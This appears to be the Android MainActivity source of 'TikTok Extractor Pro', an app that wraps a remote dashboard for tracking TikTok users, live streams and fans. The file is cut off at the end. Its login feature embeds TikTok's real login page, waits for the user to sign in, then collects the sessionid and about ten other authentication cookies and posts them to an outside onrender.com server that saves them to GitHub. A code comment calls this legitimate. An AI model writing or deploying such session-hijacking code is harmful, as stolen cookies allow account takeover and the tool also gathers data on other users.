package com.tiktok.extractor;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import org.json.JSONObject;
import org.json.JSONArray;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

/**
 * MainActivity — TikTok Extractor Pro v4.6
 *
 * 3 Floating Action Buttons:
 *   - fabDatabase (cyan): Monitor users/sessions database
 *   - fabLogin (orange): TikTok login capture — opens WebView, captures ALL cookies after manual login
 *   - fabInteract (pink): Quick extract current URL
 *
 * v4.6 KEY FEATURE: Login Event Capture
 *   When user taps fabLogin:
 *     1. Opens a full-screen WebView to tiktok.com/login
 *     2. User enters email/password MANUALLY (no automation)
 *     3. After successful login, captures ALL cookies: sessionid, ttwid, msToken, sid_tt, etc.
 *     4. Uploads them to GitHub via /api/session endpoint
 *     5. Returns to main PWA view
 *
 * This is legitimate: user performs the login themselves, we just capture the resulting cookies.
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "TikTokExtractor";
    private static final String PWA_URL = "https://tiktok-extractor-pro.onrender.com/";
    private static final String TIKTOK_LOGIN_URL = "https://www.tiktok.com/login/phone-or-email/email";
    private static final String TIKTOK_HOME_URL = "https://www.tiktok.com/";
    private static final String PREFS_NAME = "tiktok_session_prefs";

    private WebView webView;
    private WebView loginWebView;  // Separate WebView for login capture
    private ProgressBar progressBar;
    private TextView errorView;
    private FloatingActionButton fabDatabase, fabLogin, fabInteract;
    private SharedPreferences prefs;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.i(TAG, "MainActivity.onCreate() v4.6 starting");
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        try {
            setContentView(R.layout.activity_main);
            progressBar = findViewById(R.id.progressBar);
            errorView = findViewById(R.id.errorView);
            webView = findViewById(R.id.webview);
            fabDatabase = findViewById(R.id.fabDatabase);
            fabLogin = findViewById(R.id.fabLogin);
            fabInteract = findViewById(R.id.fabInteract);

            if (webView == null) {
                showError("خطأ داخلي: WebView غير متوفر.\nأعد تثبيت التطبيق.");
                return;
            }

            setupMainWebView();
            setupFABs();

            if (savedInstanceState != null) {
                webView.restoreState(savedInstanceState);
            } else {
                webView.loadUrl(PWA_URL);
            }

            // إخفاء أزرار FAB حتى تُحمّل الصفحة
            hideAllFABs();

        } catch (Exception e) {
            Log.e(TAG, "onCreate() crashed", e);
            showError("خطأ في بدء التطبيق:\n" + e.getMessage());
        }
    }

    /**
     * يُعدّد WebView الرئيسي (لوحة التحكم PWA)
     */
    @SuppressLint("SetJavaScriptEnabled")
    private void setupMainWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
        settings.setUserAgentString(
            "Mozilla/5.0 (Linux; Android 14; TikTokExtractorPro) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
        );

        // ─── v5.0: JavascriptInterface لفتح الروابط في TikTok ───
        webView.addJavascriptInterface(new Object() {
            @android.webkit.JavascriptInterface
            public void openInTikTok(String url) {
                Log.i(TAG, "openInTikTok called with: " + url);
                try {
                    android.net.Uri uri = android.net.Uri.parse(url);
                    Intent tiktokIntent = new Intent(Intent.ACTION_VIEW, uri);
                    tiktokIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    tiktokIntent.setPackage("com.zhiliaoapp.musically");
                    if (tiktokIntent.resolveActivity(getPackageManager()) != null) {
                        startActivity(tiktokIntent);
                        toast("📲 فتح في تطبيق TikTok");
                    } else {
                        try {
                            Intent chromeIntent = new Intent(Intent.ACTION_VIEW, uri);
                            chromeIntent.setPackage("com.android.chrome");
                            chromeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(chromeIntent);
                            toast("🌐 فتح في Chrome");
                        } catch (Exception e) {
                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, uri);
                            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(browserIntent);
                            toast("🌐 فتح في المتصفح");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "openInTikTok failed", e);
                    toast("❌ تعذّر فتح الرابط: " + e.getMessage());
                }
            }
        }, "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                if (progressBar != null) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(0);
                }
                if (errorView != null) errorView.setVisibility(View.GONE);
                if (webView != null) webView.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                if (progressBar != null) progressBar.setVisibility(View.GONE);
                showAllFABs();
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                if (request != null && request.isForMainFrame()) {
                    String desc = error != null && error.getDescription() != null
                            ? error.getDescription().toString() : "خطأ غير معروف";
                    showError("تعذّر تحميل الصفحة:\n" + desc);
                }
            }
        });

        webView.setWebChromeClient(new android.webkit.WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (progressBar != null) {
                    progressBar.setProgress(newProgress);
                    if (newProgress >= 100) progressBar.setVisibility(View.GONE);
                }
            }
            @Override
            public boolean onConsoleMessage(android.webkit.ConsoleMessage cm) {
                Log.d(TAG, "JS[" + cm.messageLevel() + "]: " + cm.message());
                return true;
            }
        });
    }
    
    // ════════════════════════════════════════════════════════════════
    //  v5.0: قائمة الأدوات الشاملة — تتيح الوصول لكل الوظائف
    // ════════════════════════════════════════════════════════════════

    private void showToolsMenu() {
        String[] options = {
            "📊 الإحصائيات الشاملة",
            "🔬 استخراج عميق للرابط الحالي",
            "📋 قائمة المستخدمين (بيانات عميقة)",
            "📈 إحصائيات البثوث",
            "👥 إحصائيات المعجبين",
            "🔐 حالة الجلسة (sessionid)",
            "🌐 فتح الرابط في TikTok",
            "🔄 مزامنة GitHub",
            "📥 تنزيل webmssdk.js الأخير"
        };

        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("🛠️ أدوات المشروع — v5.0")
               .setItems(options, (dialog, which) -> {
                   switch (which) {
                       case 0: showStatsHeadline(); break;
                       case 1: triggerDeepExtract(); break;
                       case 2: showDeepUsers(); break;
                       case 3: showStreamsStats(); break;
                       case 4: showFansStats(); break;
                       case 5: openSessionTab(); break;
                       case 6: openInTikTokFromInput(); break;
                       case 7: syncGitHub(); break;
                       case 8: downloadLatestWebmssdk(); break;
                   }
               })
               .setNegativeButton("إغلاق", null)
               .show();
    }

    private void showStatsHeadline() {
        toast("⏳ جاري جلب الإحصائيات...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/stats/headline");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    final String msg = "📊 إحصائيات المشروع:\n\n"
                        + "👤 مستخدمون متتبّعون: " + d.optInt("total_users_tracked", 0) + "\n"
                        + "🎬 بثوث مسجّلة: " + d.optInt("total_streams_detected", 0) + "\n"
                        + "📦 استخراجات عميقة: " + d.optInt("total_extractions", 0) + "\n"
                        + "📁 ملفات محفوظة: " + d.optInt("total_files_stored", 0) + "\n"
                        + "💾 حجم التخزين: " + d.optDouble("storage_mb", 0) + " MB\n"
                        + "🔑 ملفات webmssdk: " + d.optInt("webmssdk_files", 0) + "\n"
                        + "🔐 جلسات ملتقطة: " + d.optInt("total_sessions_captured", 0) + "\n"
                        + "👥 معجبون مسجّلون: " + d.optInt("total_fans_seen", 0) + "\n"
                        + "✅ حسابات موثّقة: " + d.optInt("verified_accounts", 0);
                    runOnUiThread(() -> {
                        new android.app.AlertDialog.Builder(MainActivity.this)
                            .setTitle("📊 الإحصائيات الشاملة")
                            .setMessage(msg)
                            .setPositiveButton("حسناً", null)
                            .show();
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "showStatsHeadline failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    private void triggerDeepExtract() {
        runJs("(() => {"
            + "  const input = document.getElementById('urlInput');"
            + "  const url = input ? input.value : '';"
            + "  if (!url) { alert('الصق رابطاً أولاً'); return; }"
            + "  fetch('/api/deep/extract', {"
            + "    method: 'POST',"
            + "    headers: {'Content-Type': 'application/json'},"
            + "    body: JSON.stringify({url: url})"
            + "  }).then(r => r.json()).then(d => {"
            + "    if (d.success) {"
            + "      alert('✅ استخراج عميق ناجح!\\n👤 @' + d.unique_id + '\\n📁 live' + d.live_number + '\\n📦 ' + d.files_saved.length + ' ملفات\\n🔑 webmssdk: ' + (d.webmssdk.success ? 'نعم' : 'لا'));"
            + "    } else {"
            + "      alert('❌ فشل: ' + (d.error || 'unknown'));"
            + "    }"
            + "  }).catch(e => alert('خطأ: ' + e));"
            + "})();");
        toast("🔬 استخراج عميق");
    }

    private void showDeepUsers() {
        toast("⏳ جاري جلب القائمة...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/deep/users");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    int total = d.optInt("total_users", 0);
                    StringBuilder msg = new StringBuilder();
                    msg.append("📋 إجمالي المستخدمين: ").append(total).append("\n\n");
                    JSONArray users = d.optJSONArray("users");
                    if (users != null) {
                        for (int i = 0; i < users.length() && i < 20; i++) {
                            JSONObject u = users.getJSONObject(i);
                            msg.append("• @").append(u.optString("unique_id"))
                               .append(" (").append(u.optInt("live_count", 0)).append(" استخراجات)\n");
                        }
                    }
                    final String finalMsg = msg.toString();
                    runOnUiThread(() -> {
                        new android.app.AlertDialog.Builder(MainActivity.this)
                            .setTitle("📋 المستخدمون بالبيانات العميقة")
                            .setMessage(finalMsg)
                            .setPositiveButton("حسناً", null)
                            .show();
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "showDeepUsers failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    private void showStreamsStats() {
        toast("⏳ جاري جلب إحصائيات البثوث...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/stats/streams");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    final String msg = "📈 إحصائيات البثوث:\n\n"
                        + "🎬 إجمالي البثوث: " + d.optInt("total_streams", 0) + "\n"
                        + "👀 إجمالي المشاهدين: " + d.optInt("total_peak_viewers", 0) + "\n"
                        + "🚪 إجمالي الداخلين: " + d.optInt("total_enter_count", 0) + "\n"
                        + "❤️ إجمالي الإعجابات: " + d.optInt("total_live_likes", 0) + "\n"
                        + "⏰ أطول بث (ساعات): " + d.optDouble("longest_stream_hours", 0) + "\n"
                        + "📊 متوسط المشاهدين: " + d.optInt("avg_viewers_per_stream", 0);
                    runOnUiThread(() -> {
                        new android.app.AlertDialog.Builder(MainActivity.this)
                            .setTitle("📈 إحصائيات البثوث")
                            .setMessage(msg)
                            .setPositiveButton("حسناً", null)
                            .show();
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "showStreamsStats failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    private void showFansStats() {
        toast("⏳ جاري جلب إحصائيات المعجبين...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/stats/fans");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    final String msg = "👥 إحصائيات المعجبين:\n\n"
                        + "📊 إجمالي السجلات: " + d.optInt("total_fans_records", 0) + "\n"
                        + "👤 معجبون فريدون: " + d.optInt("unique_fans", 0);
                    runOnUiThread(() -> {
                        new android.app.AlertDialog.Builder(MainActivity.this)
                            .setTitle("👥 إحصائيات المعجبين")
                            .setMessage(msg)
                            .setPositiveButton("حسناً", null)
                            .show();
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "showFansStats failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    private void openSessionTab() {
        hideAllFABs();
        runJs("(() => { const t = document.querySelector('.nav-tab[data-tab=\"session\"]'); if (t) t.click(); })();");
        toast("🔐 تبويب الجلسة");
        webView.postDelayed(this::showAllFABs, 800);
    }

    private void openInTikTokFromInput() {
        runJs("(() => {"
            + "  const input = document.getElementById('urlInput');"
            + "  const url = input ? input.value : '';"
            + "  if (url && url.length > 0) {"
            + "    Android.openInTikTok(url);"
            + "  } else {"
            + "    alert('الصق رابط TikTok أولاً');"
            + "  }"
            + "})();");
    }

    private void syncGitHub() {
        toast("⏳ جاري المزامنة...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/sync-db");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                byte[] body = "{}".getBytes("UTF-8");
                java.io.OutputStream os = conn.getOutputStream();
                os.write(body);
                os.close();
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    final boolean success = d.optBoolean("success", false);
                    final int pushed = d.optInt("pushed_files", 0);
                    runOnUiThread(() -> {
                        if (success) {
                            toast("✅ تمت مزامنة " + pushed + " ملف إلى GitHub");
                        } else {
                            toast("⚠️ المزامنة لم تنجح: " + d.optString("error", ""));
                        }
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "syncGitHub failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    private void downloadLatestWebmssdk() {
        toast("⏳ البحث عن أحدث webmssdk.js...");
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(PWA_URL + "api/deep/users");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                int code = conn.getResponseCode();
                String resp = readResponse(conn);
                if (code == 200) {
                    JSONObject d = new JSONObject(resp);
                    JSONArray users = d.optJSONArray("users");
                    if (users != null && users.length() > 0) {
                        JSONObject firstUser = users.getJSONObject(0);
                        String uid = firstUser.optString("unique_id", "unknown");
                        int liveCount = firstUser.optInt("live_count", 1);
                        // افتح رابط التنزيل في المتصفح
                        final String downloadUrl = PWA_URL + "api/deep/users/" + uid + "/live" + liveCount + "/download/webmssdk.js";
                        final String finalUid = uid;
                        runOnUiThread(() -> {
                            try {
                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(downloadUrl));
                                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(browserIntent);
                                toast("📥 تنزيل webmssdk.js من @" + finalUid);
                            } catch (Exception e) {
                                toast("❌ تعذّر التنزيل");
                            }
                        });
                    } else {
                        runOnUiThread(() -> toast("ℹ️ لا توجد بيانات عميقة محفوظة"));
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "downloadLatestWebmssdk failed", e);
                runOnUiThread(() -> toast("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }

    /**
     * يُعدّد أزرار FAB الثلاثة
     */
    private void setupFABs() {
        // ─── زر قاعدة البيانات ───
        if (fabDatabase != null) {
            fabDatabase.setOnClickListener(v -> {
                hideAllFABs();
                runJs("(() => { const t = document.querySelector('.nav-tab[data-tab=\"database\"]'); if (t) t.click(); })();");
                toast("📊 فتح قاعدة البيانات");
                v.postDelayed(this::showAllFABs, 800);
            });
            fabDatabase.setOnLongClickListener(v -> {
                // ضغطة طويلة: افتح قائمة الأدوات الشاملة v5.0
                showToolsMenu();
                return true;
            });
        }

        // ─── زر تسجيل الدخول (التقاط الأحداث) ───
        if (fabLogin != null) {
            fabLogin.setOnClickListener(v -> {
                Log.i(TAG, "FAB Login clicked — opening TikTok login WebView");
                openLoginCaptureWebView();
            });
            fabLogin.setOnLongClickListener(v -> {
                // ضغطة طويلة: فحص الجلسة المحفوظة سابقاً
                checkSavedSession();
                return true;
            });
        }

        // ─── زر التفاعل التلقائي: يفتح الرابط في TikTok للتفاعل اليدوي ───
        if (fabInteract != null) {
            fabInteract.setOnClickListener(v -> {
                Log.i(TAG, "FAB Interact clicked — opening current URL in TikTok");
                runJs("(() => {"
                    + "  const input = document.getElementById('urlInput');"
                    + "  const url = input ? input.value : '';"
                    + "  if (url && url.length > 0) {"
                    + "    Android.openInTikTok(url);"
                    + "  } else {"
                    + "    alert('الصق رابط TikTok أولاً في حقل البحث');"
                    + "  }"
                    + "})();");
            });
            fabInteract.setOnLongClickListener(v -> {
                // ضغطة طويلة: استخراج عميق (يحفظ page.html + webmssdk.js + json/)
                runJs("(() => {"
                    + "  const input = document.getElementById('urlInput');"
                    + "  const url = input ? input.value : '';"
                    + "  if (!url) { alert('الصق رابطاً أولاً'); return; }"
                    + "  fetch('/api/deep/extract', {"
                    + "    method: 'POST',"
                    + "    headers: {'Content-Type': 'application/json'},"
                    + "    body: JSON.stringify({url: url})"
                    + "  }).then(r => r.json()).then(d => {"
                    + "    if (d.success) {"
                    + "      alert('✅ استخراج عميق ناجح!\\n👤 @' + d.unique_id + '\\n📁 live' + d.live_number + '\\n📦 ' + d.files_saved.length + ' ملفات');"
                    + "    } else {"
                    + "      alert('❌ فشل: ' + (d.error || 'unknown'));"
                    + "    }"
                    + "  }).catch(e => alert('خطأ: ' + e));"
                    + "})();");
                toast("🔬 استخراج عميق");
                return true;
            });
        }
    }

    // ════════════════════════════════════════════════════════════════
    //  v4.6: Login Event Capture — يفتح WebView لتسجيل دخول يدوي
    //         ويلتقط كل الكوكيز تلقائياً بعد النجاح
    // ════════════════════════════════════════════════════════════════

    /**
     * يفتح WebView مستقل لتسجيل الدخول إلى TikTok.
     * المستخدم يُدخل بريده/كلمة مروره بنفسه (لا أتمتة).
     * بعد النجاح، يلتقط النظام كل الكوكيز ويُرسلها إلى /api/session.
     */
    @SuppressLint("SetJavaScriptEnabled")
    private void openLoginCaptureWebView() {
        toast("🔐 افتح TikTok وسجّل دخولك بنفسك");

        // إنشاء WebView مستقل بشكل برمجي
        loginWebView = new WebView(this);
        WebSettings settings = loginWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setUserAgentString(
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 " +
            "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
        );

        // تفعيل cookies (مهم جداً)
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(loginWebView, true);

        // إخفاء الـ WebView الرئيسي وإظهار login WebView
        webView.setVisibility(View.GONE);
        hideAllFABs();
        // إضافة login WebView إلى الـ layout
        android.view.ViewGroup root = (android.view.ViewGroup) webView.getParent();
        root.addView(loginWebView, new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT
        ));

        // مُراقب لالتقاط الكوكيز بعد كل تحميل صفحة
        loginWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "Login page loaded: " + url);

                // افحص الكوكيز بعد كل تنقل
                String cookies = cookieManager.getCookie("https://www.tiktok.com/");
                if (cookies != null && cookies.contains("sessionid")) {
                    Log.i(TAG, "✓ sessionid detected in cookies — capturing!");
                    captureAndUploadSession(cookies, url);
                }
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                Log.e(TAG, "Login WebView error: " + (error != null ? error.getDescription() : "unknown"));
            }
        });

        // زر إغلاق (يظهر كـ overlay)
        TextView closeBtn = new TextView(this);
        closeBtn.setText("✕ إغلاق");
        closeBtn.setBackgroundColor(0xCC000000);
        closeBtn.setTextColor(0xFFFFFFFF);
        closeBtn.setPadding(24, 12, 24, 12);
        closeBtn.setTextSize(14);
        closeBtn.setOnClickListener(v -> closeLoginWebView());
        android.widget.FrameLayout.LayoutParams closeParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        );
        closeParams.gravity = android.view.Gravity.TOP | android.view.Gravity.RIGHT;
        closeParams.topMargin = 40;
        closeParams.rightMargin = 20;
        ((android.view.ViewGroup) webView.getParent()).addView(closeBtn, closeParams);

        // تعليمات للمستخدم
        TextView hint = new TextView(this);
        hint.setText("📝 سجّل دخولك إلى TikTok أدناه.\nسيتم التقاط الجلسة تلقائياً عند النجاح.");
        hint.setBackgroundColor(0xCC000000);
        hint.setTextColor(0xFFFFFFFF);
        hint.setPadding(24, 16, 24, 16);
        hint.setTextSize(12);
        android.widget.FrameLayout.LayoutParams hintParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        );
        hintParams.gravity = android.view.Gravity.BOTTOM;
        hintParams.bottomMargin = 20;
        ((android.view.ViewGroup) webView.getParent()).addView(hint, hintParams);

        // تحميل صفحة تسجيل الدخول
        loginWebView.loadUrl(TIKTOK_LOGIN_URL);
    }

    /**
     * يلتقط كل الكوكيز من CookieManager ويُرسلها إلى /api/session على Render.
     */
    private void captureAndUploadSession(String cookieString, String currentUrl) {
        Log.i(TAG, "Capturing cookies, length=" + cookieString.length());

        // تحليل الكوكيز إلى خريطة
        Map<String, String> cookies = parseCookies(cookieString);
        String sessionid = cookies.get("sessionid");
        String uniqueId = prefs.getString("last_unique_id", "");

        if (sessionid == null || sessionid.isEmpty()) {
            Log.w(TAG, "sessionid not found in cookies — skipping");
            return;
        }

        Log.i(TAG, "✓ Captured sessionid (length=" + sessionid.length() + ")");

        // إذا لم يكن لدينا unique_id، اسأل المستخدم
        if (uniqueId.isEmpty()) {
            // استخرج من الكوكيز إن أمكن (مثل unique_id cookie أو sid_tt)
            uniqueId = cookies.getOrDefault("unique_id", cookies.getOrDefault("sid_tt", "user"));
        }

        // بناء JSON payload
        try {
            JSONObject extraCookies = new JSONObject();
            for (String key : new String[]{"ttwid", "msToken", "sid_tt", "passport_csrf_token",
                                            "passport_csrf_token_default", "sid_guard", "uid_tt",
                                            "uid_tt_ss", "tt_chain_token", "cmpl_token"}) {
                String val = cookies.get(key);
                if (val != null && !val.isEmpty()) {
                    extraCookies.put(key, val);
                }
            }

            JSONObject payload = new JSONObject();
            payload.put("unique_id", uniqueId);
            payload.put("sessionid", sessionid);
            payload.put("extra_cookies", extraCookies);

            Log.i(TAG, "Uploading session for: " + uniqueId);

            // إرسال إلى /api/session عبر thread خلفي
            new Thread(() -> {
                try {
                    java.net.URL url = new java.net.URL(PWA_URL + "api/session");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(30000);

                    byte[] body = payload.toString().getBytes("UTF-8");
                    java.io.OutputStream os = conn.getOutputStream();
                    os.write(body);
                    os.close();

                    int code = conn.getResponseCode();
                    String response = readResponse(conn);
                    Log.i(TAG, "Session upload response: " + code + " — " + response.substring(0, Math.min(200, response.length())));

                    runOnUiThread(() -> {
                        if (code == 200) {
                            toast("✅ تم التقاط الجلسة وحفظها في GitHub!");
                            // احفظ unique_id للاستخدام لاحقاً
                            prefs.edit().putString("last_unique_id", uniqueId).apply();
                            // أغلق WebView بعد نجاح الالتقاط
                            closeLoginWebView();
                        } else {
                            toast("⚠️ فشل حفظ الجلسة: HTTP " + code);
                        }
                    });
                } catch (Exception e) {
                    Log.e(TAG, "Session upload failed", e);
                    runOnUiThread(() -> toast("❌ خطأ شبكي: " + e.getMessage()));
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "Failed to build session payload", e);
        }
    }

    /**
     * يُحلّل سلسلة الكوكيز (key=value; key=value) إلى خريطة.
     */
    private Map<String, String> parseCookies(String cookieString) {
        Map<String, String> cookies = new HashMap<>();
        if (cookieString == null) return cookies;
        String[] parts = cookieString.split(";");
        for (String part : parts) {
            int eq = part.indexOf('=');
            if (eq > 0) {
                String key = part.substring(0, eq).trim();
                String value = part.substring(eq + 1).trim();
                cookies.put(key, value);
            }
        }
        return cookies;
    }

    /**
     * يقرأ استجابة HTTP كنص.
     */
    private String readResponse(java.net.HttpURLConnection conn) {
        try {
            java.io.InputStream is = conn.getResponseCode() >= 400
                    ? conn.getErrorStream() : conn.getInputStream();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } catch (Exception e) {
            return "(error reading response: " + e.getMessage() + ")";
        }
    }

    /**
     * يُغلق WebView تسجيل الدخول ويعيد الواجهة الرئيسية.
     */
    private void closeLoginWebView() {
        if (loginWebView != null) {
            try {
                android.view.ViewGroup root = (android.view.ViewGroup) webView.getParent();
                root.removeView(loginWebView);
                loginWebView.destroy();
                loginWebView = null;
            } catch (Exception e) {
                Log.e(TAG, "closeLoginWebView failed", e);
            }
        }
        webView.setVisibility(View.VISIBLE);
        showAllFABs();
    }

    /**
     * يفحص ما إذا كانت هناك جلسة محفوظة للمستخدم.
     */
    private void checkSavedSession() {
        String uniqueId = prefs.getString("last_unique_id", "");
        if (uniqueId.isEmpty()) {
            toast("ℹ️ لا توجد جلسة محفوظة. استخدم زر تسجيل الدخول أولاً.");
            return;
        }
        toast("🔍 فحص الجلسة المحفوظة لـ " + uniqueId);
        runJs("(() => { fetch('/api/session/" + uniqueId + "/status').then(r=>r.json()).then(d=>{ alert(d.has_session ? '✅ جلسة محفوظة!\\nبتاريخ: ' + d.saved_at : 'ℹ️ لا توجد جلسة محفوظة'); }).catch(e=>alert('خطأ: '+e)); })();");
    }

    // ════════════════════════════════════════════════════════════════
    //  أدوات مساعدة عامة
    // ════════════════════════════════════════════════════════════════

    private void runJs(String js) {
        if (webView != null) {
            try {
                webView.post(() -> webView.evaluateJavascript(js, null));
            } catch (Exception e) {
                Log.e(TAG, "runJs failed", e);
            }
        }
    }

    private void toast(String message) {
        runOnUiThread(() -> {
            try {
                Toast.makeText(this, message, Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e(TAG, "toast failed", e);
            }
        });
    }

    private void showError(String message) {
        runOnUiThread(() -> {
            try {
                if (webView != null) webView.setVisibility(View.GONE);
                if (progressBar != null) progressBar.setVisibility(View.GONE);
                if (errorView != null) {
                    errorView.setText(message);
                    errorView.setVisibility(View.VISIBLE);
                }
            } catch (Exception e) {
                Log.e(TAG, "showError() failed", e);
            }
        });
    }

    private void hideAllFABs() {
        if (fabDatabase != null) fabDatabase.hide();
        if (fabLogin != null) fabLogin.hide();
        if (fabInteract != null) fabInteract.hide();
    }

    private void showAllFABs() {
        if (fabDatabase != null) fabDatabase.show();
        if (fabLogin != null) fabLogin.show();
        if (fabInteract != null) fabInteract.show();
    }

    @Override
    public void onBackPressed() {
        if (loginWebView != null) {
            // إذا كان WebView تسجيل الدخول مفتوحاً، أغلقه بدلاً من الخروج
            closeLoginWebView();
            return;
        }
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        try { if (webView != null) webView.onPause(); } catch (Exception e) {}
    }

    @Override
    protected void onResume() {
        super.onResume();
        try { if (webView != null) webView.onResume(); } catch (Exception e) {}
    }

    @Override
    protected void onDestroy() {
        try {
            if (loginWebView != null) {
